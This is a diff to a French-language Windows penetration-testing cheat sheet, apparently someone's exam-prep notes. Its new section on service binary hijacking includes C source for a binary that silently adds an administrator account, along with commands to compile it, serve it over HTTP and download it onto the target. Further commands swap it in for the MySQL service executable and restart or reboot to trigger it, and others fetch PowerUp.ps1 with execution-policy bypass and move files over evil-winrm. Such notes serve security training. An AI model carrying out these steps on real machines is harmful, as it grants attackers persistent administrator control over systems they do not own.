@@ -165,6 +165,8 @@ Enter-PSSession -ComputerName <host> -Credential $cred
 
 ```bash
 evil-winrm -i <ip> -u '<username>' -p '<password>'
+download fichier
+upload fichier
 ```
 
 **Event Viewer**
@@ -219,8 +221,6 @@ winget install Microsoft.VisualStudio.2022.BuildTools
 git clone https://github.com/GhostPack/Seatbelt.git
 cd Seatbelt
 msbuild Seatbelt.sln /p:Configuration=Release
-
-
 ```
 
 ```powershell
@@ -248,3 +248,82 @@ dir "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramewo
 ```cmd
 msbuild Seatbelt.sln /p:Configuration=Release
 ```
+
+## Windows Services
+
+### Service Binary Hijacking
+
+**Lister les services en cours avec leur binaire**
+
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+```
+
+**Vérifier les permissions sur un binaire de service**
+
+Masks : `F` = Full, `M` = Modify, `RX` = Read+Execute, `R` = Read, `W` = Write.
+
+```cmd
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+```
+
+**Créer un binaire malveillant (ajoute un user admin)**
+
+```c
+#include <stdlib.h>
+int main() {
+  system("net user dave2 password123! /add");
+  system("net localgroup administrators dave2 /add");
+  return 0;
+}
+```
+
+```bash
+# Compiler sur Kali
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+python3 -m http.server 80
+```
+
+**Remplacer le binaire et déclencher l'exécution**
+
+```powershell
+iwr -uri http://<ip>/adduser.exe -Outfile adduser.exe
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe        # backup
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+# Redémarrer le service (si permissions suffisantes)
+net stop mysql
+net start mysql
+```
+
+**Vérifier le Startup Type et les privilèges de reboot**
+
+Si le service est `Auto`, un reboot suffit. Vérifier `SeShutdownPrivilege`.
+
+```powershell
+Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
+whoami /priv
+shutdown /r /t 0
+```
+
+**Vérifier que l'exploitation a fonctionné**
+
+```powershell
+Get-LocalGroupMember administrators
+```
+
+**PowerUp - détecter les binaires de service modifiables**
+
+```bash
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+```
+
+```powershell
+iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
+
+Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'exploitation manuellement.
